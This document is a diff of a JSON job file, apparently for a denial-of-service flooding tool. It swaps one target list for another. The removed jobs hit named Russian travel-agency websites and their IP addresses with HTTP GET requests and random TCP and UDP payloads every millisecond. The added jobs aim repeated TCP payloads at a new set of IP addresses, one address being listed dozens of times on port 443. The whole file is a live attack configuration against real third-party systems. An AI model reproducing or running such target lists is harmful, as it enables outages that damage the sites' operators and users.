@@ -1,62 +1,10 @@
 {
   "jobs": [
     {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "https://turskidki.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "http://turskidki.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "193.164.150.212:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "https://anex-tour.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "http://anex-tour.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "95.214.60.149:21",
+        "address": "185.165.123.70:80",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -64,7 +12,7 @@
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "95.214.60.149:22",
+        "address": "185.165.123.70:443",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -72,7 +20,7 @@
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "95.214.60.149:80",
+        "address": "185.165.123.97:80",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -80,67 +28,7 @@
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "95.214.60.149:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "https://www.bankturov.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "http://www.bankturov.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "94.26.241.164:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "https://www.1001tur.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "http://www.1001tur.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "89.208.35.174:22",
+        "address": "185.165.123.97:443",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -148,7 +36,7 @@
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "89.208.35.174:80",
+        "address": "151.236.114.7:443",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -156,61 +44,7 @@
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "89.208.35.174:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 1,
-      "args": {
-        "address": "89.208.35.174:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 1,
-      "args": {
-        "address": "89.208.35.174:123",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 1,
-      "args": {
-        "address": "89.208.35.174:500",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "https://tours.tutu.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "http://tours.tutu.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "178.248.236.15:80",
+        "address": "151.236.114.7:80",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -218,37 +52,7 @@
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "178.248.236.15:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "https://travelata.ru/ "
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 1,
-          "path": "http://travelata.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "178.248.232.202:80",
+        "address": "151.236.114.27:80",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -256,7 +60,311 @@
       "type": "tcp",
       "count": 1,
       "args": {
-        "address": "178.248.232.202:443",
+        "address": "151.236.114.27:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "151.236.114.6:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "151.236.114.6:80",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "151.236.114.26:80",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "151.236.114.26:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "91.232.93.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "91.232.93.70:80",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "213.5.80.180:80",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "213.5.80.180:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.165.123.70:443",
         "body": "{{ random_payload 100 }}"
       }
     }
